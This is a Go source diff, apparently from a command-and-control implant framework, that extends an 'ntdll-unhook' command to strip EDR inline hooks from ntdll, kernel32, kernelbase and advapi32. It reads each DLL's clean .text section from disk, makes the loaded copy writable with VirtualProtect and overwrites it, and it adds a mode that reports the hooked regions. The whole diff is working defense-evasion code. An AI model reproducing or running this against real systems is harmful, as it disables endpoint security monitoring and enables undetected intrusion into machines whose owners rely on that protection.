@@ -14,7 +14,8 @@ import (
 	"fawkes/pkg/structs"
 )
 
-// ntdll unhooking: read clean ntdll.dll from disk, replace hooked .text section in memory
+// DLL unhooking: read clean DLL from disk, replace hooked .text section in memory
+// Supports ntdll.dll, kernel32.dll, kernelbase.dll, advapi32.dll
 
 // New kernel32 procs needed for file mapping
 var (
@@ -63,6 +64,9 @@ type imageSectionHeader struct {
 	Characteristics      uint32
 }
 
+// Supported DLLs for unhooking
+var unhookableDLLs = []string{"ntdll.dll", "kernel32.dll", "kernelbase.dll", "advapi32.dll"}
+
 // NtdllUnhookCommand implements the ntdll-unhook command
 type NtdllUnhookCommand struct{}
 
@@ -71,11 +75,12 @@ func (c *NtdllUnhookCommand) Name() string {
 }
 
 func (c *NtdllUnhookCommand) Description() string {
-	return "Remove EDR hooks from ntdll.dll by restoring the .text section from disk"
+	return "Remove EDR hooks from DLLs by restoring the .text section from disk"
 }
 
 type ntdllUnhookArgs struct {
 	Action string `json:"action"` // unhook, check
+	DLL    string `json:"dll"`    // ntdll.dll, kernel32.dll, kernelbase.dll, advapi32.dll, all
 }
 
 func (c *NtdllUnhookCommand) Execute(task structs.Task) structs.CommandResult {
@@ -101,34 +106,57 @@ func (c *NtdllUnhookCommand) Execute(task structs.Task) structs.CommandResult {
 	if args.Action == "" {
 		args.Action = "unhook"
 	}
+	if args.DLL == "" {
+		args.DLL = "ntdll.dll"
+	}
+
+	// Determine which DLLs to operate on
+	var targetDLLs []string
+	if strings.ToLower(args.DLL) == "all" {
+		targetDLLs = unhookableDLLs
+	} else {
+		targetDLLs = []string{args.DLL}
+	}
 
 	switch strings.ToLower(args.Action) {
 	case "unhook":
-		output, err := PerformUnhookNtdll()
-		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error: %v", err),
-				Status:    "error",
-				Completed: true,
+		var sb strings.Builder
+		allSuccess := true
+		for _, dll := range targetDLLs {
+			output, err := unhookDLL(dll)
+			sb.WriteString(output)
+			if err != nil {
+				sb.WriteString(fmt.Sprintf("[!] Error unhooking %s: %v\n", dll, err))
+				allSuccess = false
+			}
+			if len(targetDLLs) > 1 {
+				sb.WriteString("\n")
 			}
 		}
+		status := "success"
+		if !allSuccess {
+			status = "error"
+		}
 		return structs.CommandResult{
-			Output:    output,
-			Status:    "success",
+			Output:    sb.String(),
+			Status:    status,
 			Completed: true,
 		}
 
 	case "check":
-		output, err := checkNtdllHooks()
-		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error: %v", err),
-				Status:    "error",
-				Completed: true,
+		var sb strings.Builder
+		for _, dll := range targetDLLs {
+			output, err := checkDLLHooks(dll)
+			sb.WriteString(output)
+			if err != nil {
+				sb.WriteString(fmt.Sprintf("[!] Error checking %s: %v\n", dll, err))
+			}
+			if len(targetDLLs) > 1 {
+				sb.WriteString("\n")
 			}
 		}
 		return structs.CommandResult{
-			Output:    output,
+			Output:    sb.String(),
 			Status:    "success",
 			Completed: true,
 		}
@@ -142,25 +170,30 @@ func (c *NtdllUnhookCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 }
 
-// PerformUnhookNtdll reads a clean copy of ntdll.dll from disk and overwrites
-// the in-memory .text section, removing any EDR inline hooks.
+// PerformUnhookNtdll is a convenience wrapper for unhookDLL("ntdll.dll").
 // Exported so other commands (e.g., start-clr) can call it.
 func PerformUnhookNtdll() (string, error) {
-	var output string
-	output += "[*] ntdll.dll Unhooking\n"
+	return unhookDLL("ntdll.dll")
+}
 
-	// Step 1: Get in-memory base address of ntdll.dll
-	ntdllName, _ := syscall.UTF16PtrFromString("ntdll.dll")
-	ntdllBase, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(ntdllName)))
-	if ntdllBase == 0 {
-		return "", fmt.Errorf("GetModuleHandleW(ntdll.dll) failed")
+// unhookDLL reads a clean copy of the specified DLL from disk and overwrites
+// the in-memory .text section, removing any EDR inline hooks.
+func unhookDLL(dllName string) (string, error) {
+	var output string
+	output += fmt.Sprintf("[*] %s Unhooking\n", dllName)
+
+	// Step 1: Get in-memory base address
+	dllNameW, _ := syscall.UTF16PtrFromString(dllName)
+	dllBase, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(dllNameW)))
+	if dllBase == 0 {
+		return output, fmt.Errorf("GetModuleHandleW(%s) failed — DLL not loaded", dllName)
 	}
-	output += fmt.Sprintf("[*] In-memory ntdll base: 0x%X\n", ntdllBase)
+	output += fmt.Sprintf("[*] In-memory base: 0x%X\n", dllBase)
 
 	// Step 2: Open a clean copy from disk
-	ntdllPath, _ := syscall.UTF16PtrFromString(`C:\Windows\System32\ntdll.dll`)
+	dllPath, _ := syscall.UTF16PtrFromString(`C:\Windows\System32\` + dllName)
 	hFile, _, err := procCreateFileW.Call(
-		uintptr(unsafe.Pointer(ntdllPath)),
+		uintptr(unsafe.Pointer(dllPath)),
 		uintptr(genericRead),
 		uintptr(FILE_SHARE_READ),
 		0,
@@ -170,12 +203,11 @@ func PerformUnhookNtdll() (string, error) {
 	)
 	invalidHandle := ^uintptr(0)
 	if hFile == invalidHandle {
-		return "", fmt.Errorf("CreateFileW failed: %v", err)
+		return output, fmt.Errorf("CreateFileW failed: %v", err)
 	}
 	defer procCloseHandle.Call(hFile)
 
 	// Step 3: Create file mapping with SEC_IMAGE flag
-	// SEC_IMAGE causes Windows to map the file as a PE image with proper section alignment
 	hMapping, _, err := procCreateFileMappingW.Call(
 		hFile,
 		0,
@@ -185,7 +217,7 @@ func PerformUnhookNtdll() (string, error) {
 		0,
 	)
 	if hMapping == 0 {
-		return "", fmt.Errorf("CreateFileMappingW failed: %v", err)
+		return output, fmt.Errorf("CreateFileMappingW failed: %v", err)
 	}
 	defer procCloseHandle.Call(hMapping)
 
@@ -196,15 +228,15 @@ func PerformUnhookNtdll() (string, error) {
 		0, 0, 0,
 	)
 	if mappedBase == 0 {
-		return "", fmt.Errorf("MapViewOfFile failed: %v", err)
+		return output, fmt.Errorf("MapViewOfFile failed: %v", err)
 	}
 	defer procUnmapViewOfFile.Call(mappedBase)
-	output += fmt.Sprintf("[*] Clean ntdll mapped at: 0x%X\n", mappedBase)
+	output += fmt.Sprintf("[*] Clean copy mapped at: 0x%X\n", mappedBase)
 
 	// Step 5: Parse PE headers to find .text section
 	textSection, err := findTextSection(mappedBase)
 	if err != nil {
-		return "", fmt.Errorf("PE parsing failed: %v", err)
+		return output, fmt.Errorf("PE parsing failed: %v", err)
 	}
 
 	textVA := uintptr(textSection.VirtualAddress)
@@ -212,7 +244,7 @@ func PerformUnhookNtdll() (string, error) {
 	output += fmt.Sprintf("[*] .text section: RVA=0x%X, Size=%d bytes\n", textVA, textSize)
 
 	cleanTextAddr := mappedBase + textVA
-	hookedTextAddr := ntdllBase + textVA
+	hookedTextAddr := dllBase + textVA
 
 	// Step 6: VirtualProtect the hooked .text to PAGE_EXECUTE_READWRITE
 	var oldProtect uint32
@@ -223,7 +255,7 @@ func PerformUnhookNtdll() (string, error) {
 		uintptr(unsafe.Pointer(&oldProtect)),
 	)
 	if ret == 0 {
-		return "", fmt.Errorf("VirtualProtect (RWX) failed: %v", err)
+		return output, fmt.Errorf("VirtualProtect (RWX) failed: %v", err)
 	}
 
 	// Step 7: Copy clean .text over hooked .text
@@ -241,7 +273,7 @@ func PerformUnhookNtdll() (string, error) {
 	)
 
 	output += fmt.Sprintf("[+] Restored %d bytes of .text section\n", bytesCopied)
-	output += "[+] ntdll.dll successfully unhooked — all inline hooks removed"
+	output += fmt.Sprintf("[+] %s successfully unhooked — all inline hooks removed\n", dllName)
 
 	return output, nil
 }
@@ -285,54 +317,54 @@ func findTextSection(baseAddr uintptr) (*imageSectionHeader, error) {
 	return nil, fmt.Errorf(".text section not found in %d sections", numSections)
 }
 
-// checkNtdllHooks compares the in-memory ntdll .text section with the on-disk copy
+// checkDLLHooks compares the in-memory DLL .text section with the on-disk copy
 // and reports any differences (potential hooks)
-func checkNtdllHooks() (string, error) {
+func checkDLLHooks(dllName string) (string, error) {
 	var output string
-	output += "[*] Checking ntdll.dll for inline hooks...\n"
+	output += fmt.Sprintf("[*] Checking %s for inline hooks...\n", dllName)
 
 	// Get in-memory base
-	ntdllName, _ := syscall.UTF16PtrFromString("ntdll.dll")
-	ntdllBase, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(ntdllName)))
-	if ntdllBase == 0 {
-		return "", fmt.Errorf("GetModuleHandleW(ntdll.dll) failed")
+	dllNameW, _ := syscall.UTF16PtrFromString(dllName)
+	dllBase, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(dllNameW)))
+	if dllBase == 0 {
+		return output, fmt.Errorf("GetModuleHandleW(%s) failed — DLL not loaded", dllName)
 	}
 
 	// Map clean copy
-	ntdllPath, _ := syscall.UTF16PtrFromString(`C:\Windows\System32\ntdll.dll`)
+	dllPath, _ := syscall.UTF16PtrFromString(`C:\Windows\System32\` + dllName)
 	hFile, _, err := procCreateFileW.Call(
-		uintptr(unsafe.Pointer(ntdllPath)),
+		uintptr(unsafe.Pointer(dllPath)),
 		uintptr(genericRead), uintptr(FILE_SHARE_READ), 0, uintptr(openExisting), 0, 0,
 	)
 	invalidHandle := ^uintptr(0)
 	if hFile == invalidHandle {
-		return "", fmt.Errorf("CreateFileW failed: %v", err)
+		return output, fmt.Errorf("CreateFileW failed: %v", err)
 	}
 	defer procCloseHandle.Call(hFile)
 
 	hMapping, _, err := procCreateFileMappingW.Call(hFile, 0, uintptr(pageReadonly|secImage), 0, 0, 0)
 	if hMapping == 0 {
-		return "", fmt.Errorf("CreateFileMappingW failed: %v", err)
+		return output, fmt.Errorf("CreateFileMappingW failed: %v", err)
 	}
 	defer procCloseHandle.Call(hMapping)
 
 	mappedBase, _, err := procMapViewOfFile.Call(hMapping, uintptr(fileMapRead), 0, 0, 0)
 	if mappedBase == 0 {
-		return "", fmt.Errorf("MapViewOfFile failed: %v", err)
+		return output, fmt.Errorf("MapViewOfFile failed: %v", err)
 	}
 	defer procUnmapViewOfFile.Call(mappedBase)
 
 	// Find .text section
 	textSection, err := findTextSection(mappedBase)
 	if err != nil {
-		return "", err
+		return output, err
 	}
 
 	textVA := uintptr(textSection.VirtualAddress)
 	textSize := uintptr(textSection.SizeOfRawData)
 
 	cleanText := unsafe.Slice((*byte)(unsafe.Pointer(mappedBase+textVA)), textSize)
-	hookedText := unsafe.Slice((*byte)(unsafe.Pointer(ntdllBase+textVA)), textSize)
+	hookedText := unsafe.Slice((*byte)(unsafe.Pointer(dllBase+textVA)), textSize)
 
 	// Compare and find differences
 	hookCount := 0
@@ -343,16 +375,14 @@ func checkNtdllHooks() (string, error) {
 	for i < textSize {
 		if cleanText[i] != hookedText[i] {
 			hookCount++
-			// Find the extent of this hook (contiguous modified bytes)
 			hookStart := i
 			for i < textSize && cleanText[i] != hookedText[i] {
 				i++
 			}
 			hookLen := i - hookStart
-			hookAddr := ntdllBase + textVA + hookStart
+			hookAddr := dllBase + textVA + hookStart
 
 			if len(hooks) < maxHooksToReport {
-				// Show first few bytes of original and hooked
 				origBytes := make([]byte, minUintptr(hookLen, 8))
 				hookBytes := make([]byte, minUintptr(hookLen, 8))
 				copy(origBytes, cleanText[hookStart:])
@@ -366,17 +396,17 @@ func checkNtdllHooks() (string, error) {
 	}
 
 	if hookCount == 0 {
-		output += "[+] No hooks detected — ntdll.dll .text section matches disk copy\n"
+		output += fmt.Sprintf("[+] No hooks detected — %s .text section matches disk copy\n", dllName)
 		output += fmt.Sprintf("[*] Compared %d bytes\n", textSize)
 	} else {
-		output += fmt.Sprintf("[!] Found %d hooked regions in .text section (%d bytes)\n\n", hookCount, textSize)
+		output += fmt.Sprintf("[!] Found %d hooked regions in %s .text section (%d bytes)\n\n", hookCount, dllName, textSize)
 		for _, h := range hooks {
 			output += h + "\n"
 		}
 		if hookCount > maxHooksToReport {
 			output += fmt.Sprintf("  ... and %d more\n", hookCount-maxHooksToReport)
 		}
-		output += "\n[*] Run 'ntdll-unhook' (action=unhook) to restore clean .text section"
+		output += fmt.Sprintf("\n[*] Run 'ntdll-unhook -dll %s' (action=unhook) to restore clean .text section\n", dllName)
 	}
 
 	return output, nil
